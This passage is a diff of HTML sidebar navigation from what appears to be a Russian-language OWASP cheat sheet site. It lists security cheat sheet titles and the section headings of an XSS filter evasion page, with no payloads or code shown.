+      <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Архитектура безопасности микросервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mobile_Application_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность мобильных приложений
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Multifactor_Authentication_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Многофакторная аутентификация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Multi_Tenant_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность мультиарендных систем
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Network_Segmentation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Сегментация сети
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NodeJS_Docker_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Node.js в Docker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Nodejs_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Node.js
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NoSQL_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность NoSQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NPM_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность NPM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="OAuth2_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OAuth 2.0
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="OS_Command_Injection_Defense_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита от инъекции команд ОС
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Password_Storage_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Хранение паролей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="PHP_Configuration_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Конфигурация PHP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Pinning_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Закрепление сертификатов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Prototype_Pollution_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение Prototype Pollution
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Query_Parameterization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Параметризация запросов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="REST_Assessment_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Оценка REST
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="REST_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность REST
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Ruby_on_Rails_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ruby on Rails
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="SAML_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность SAML
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="SQL_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение SQL-инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_AI_Model_Ops_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Операции с AI-моделями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Cloud_Architecture_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасная облачная архитектура
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Code_Review_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Анализ безопасности кода
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Product_Design_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасное проектирование продукта
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность CSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Serverless_FaaS_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Serverless/FaaS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Session_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление сессиями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Software_Supply_Chain_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность цепочки поставок ПО
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Symfony_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Symfony
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secrets_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление секретами
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление сторонним JavaScript
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Third_Party_Payment_Gateway_Integration.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Интеграция платёжных шлюзов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Threat_Modeling_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Моделирование угроз
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="TLS_Cipher_String_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Строки шифров TLS (устарело)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transaction_Authorization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Авторизация транзакций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transport_Layer_Protection_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита транспортного уровня (устарело)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transport_Layer_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность транспортного уровня
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Неверифицированные перенаправления
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="User_Privacy_Protection_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита конфиденциальности пользователей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Virtual_Patching_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Виртуальные патчи
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerability_Disclosure_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Раскрытие уязвимостей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление уязвимыми зависимостями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Web_Service_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность веб-сервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="WebSocket_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность WebSocket
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение XXE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XML_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность XML
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XS_Leaks_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XS Leaks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Обход XSS-фильтров
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="XSS_Filter_Evasion_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Обход XSS-фильтров
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Введение
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тесты
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Тесты">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Базовый XSS-тест без обхода фильтров
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-locator" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Locator (полиглот)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректные теги A
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректные теги IMG
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fromcharcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      fromCharCode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#src-src" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SRC по умолчанию для обхода фильтров, проверяющих домен SRC
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#src" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SRC по умолчанию с пустым значением
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#src_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SRC по умолчанию полностью без значения
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alert" class="md-nav__link">
+    <span class="md-ellipsis">
+      Alert при ошибке
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-onerror-javascript-alert" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG onerror с кодированием JavaScript Alert
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Десятичные HTML-ссылки на символы
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Десятичные HTML-ссылки на символы без завершающей точки с запятой
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Шестнадцатеричные HTML-ссылки на символы без завершающей точки с запятой
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенная табуляция
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенная закодированная табуляция
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенный перевод строки для разрыва XSS
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Встроенный перевод строки для разрыва XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 1: разрыв XSS-атаки с помощью встроенного возврата каретки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-javascript-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 2: разрыв JavaScript-директивы с помощью нулевого символа
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-javascript-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 3: пробелы и мета-символы перед JavaScript в изображениях для XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Пример 4: XSS без буквенно-цифровых символов
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Лишние открывающие угловые скобки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отсутствие закрывающих тегов script
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Разрешение протокола в тегах script
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htmljavascript-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Полуоткрытый HTML/JavaScript XSS-вектор
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Экранирование JavaScript-экранирования
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#title" class="md-nav__link">
+    <span class="md-ellipsis">
+      Закрывающий тег TITLE
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Закрывающий тег TITLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#input-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      INPUT Image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      BODY Image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-dynsrc" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG Dynsrc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-lowsrc" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG Lowsrc
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-style-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      List-style-image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vbscript" class="md-nav__link">
+    <span class="md-ellipsis">
+      VBscript в изображении
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svg-object" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег SVG Object
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ecmascript-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      ECMAScript 6
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег BODY
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Тег BODY">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атаки с использованием обработчиков событий
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bgsound" class="md-nav__link">
+    <span class="md-ellipsis">
+      BGSOUND
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-includes" class="md-nav__link">
+    <span class="md-ellipsis">
+      &amp; JavaScript includes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-sheet" class="md-nav__link">
+    <span class="md-ellipsis">
+      STYLE sheet
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённая таблица стилей
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Удалённая таблица стилей">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённая таблица стилей, часть 2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённая таблица стилей, часть 3
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-javascript-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Теги STYLE, разрывающие JavaScript для XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атрибут STYLE, разрывающий выражение
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-style" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG STYLE с выражениями
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-background-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег STYLE с использованием Background-image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег STYLE с использованием Background
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-style" class="md-nav__link">
+    <span class="md-ellipsis">
+      Анонимный HTML с атрибутом STYLE
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htc-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Локальный htc-файл
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#us-ascii" class="md-nav__link">
+    <span class="md-ellipsis">
+      US-ASCII кодирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta" class="md-nav__link">
+    <span class="md-ellipsis">
+      META
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="META">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#meta-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      META с использованием Data
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta-url" class="md-nav__link">
+    <span class="md-ellipsis">
+      META с дополнительным параметром URL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe" class="md-nav__link">
+    <span class="md-ellipsis">
+      IFRAME
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      IFRAME на основе событий
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frame" class="md-nav__link">
+    <span class="md-ellipsis">
+      FRAME
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#table" class="md-nav__link">
+    <span class="md-ellipsis">
+      TABLE
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="TABLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#td" class="md-nav__link">
+    <span class="md-ellipsis">
+      TD
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DIV">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Background-image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image-unicode-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Background-image с Unicode XSS-эксплойтом
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Background-image с дополнительными символами
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-expression" class="md-nav__link">
+    <span class="md-ellipsis">
+      DIV Expression
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#downlevel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Скрытый блок Downlevel
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег BASE
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#object" class="md-nav__link">
+    <span class="md-ellipsis">
+      Тег OBJECT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embed-svg-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      EMBED SVG с XSS-вектором
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-data-island-cdata" class="md-nav__link">
+    <span class="md-ellipsis">
+      XML Data Island с обфускацией CDATA
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-javascript-xml-data-island" class="md-nav__link">
+    <span class="md-ellipsis">
+      Локально размещённый XML со встроенным JavaScript, генерируемым с помощью XML data island
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htmltime-xml" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML+TIME в XML
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#js" class="md-nav__link">
+    <span class="md-ellipsis">
+      При ограничении в несколько символов и фильтрации против .js
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssi-server-side-includes" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSI (Server Side Includes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG со встроенными командами
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="IMG со встроенными командами">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#img-ii" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMG со встроенными командами, часть II
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cookie Manipulation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-html-" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS с использованием инкапсуляции HTML-кавычек
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обход URL-строки
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Обход URL-строки">
+      <ul class="md-nav__list">
+        
